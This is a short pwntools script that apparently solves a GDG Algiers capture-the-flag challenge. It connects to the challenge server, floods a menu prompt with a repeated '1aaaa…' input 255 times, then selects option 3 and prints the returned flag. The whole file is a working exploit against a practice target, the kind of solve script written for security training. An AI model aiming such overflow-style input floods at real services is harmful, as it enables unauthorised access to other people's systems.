#!/usr/bin/env python3
from pwn import *

r = remote("pwn.chal.ctf.gdgalgiers.com", 1402)

charsize = 255

payload = charsize*b'1aaaaaaaaaaaaaaaaaaaaaa'
r.recvuntil(b"Choice: ")
r.sendline(payload)
for i in range(charsize):
    r.recvuntil(b"Choice: ")
r.recvuntil(b"Choice: ")
r.sendline(b"3")
flag = r.recvuntil(b"\n").decode().replace("\n", "")

r.close()

print(flag)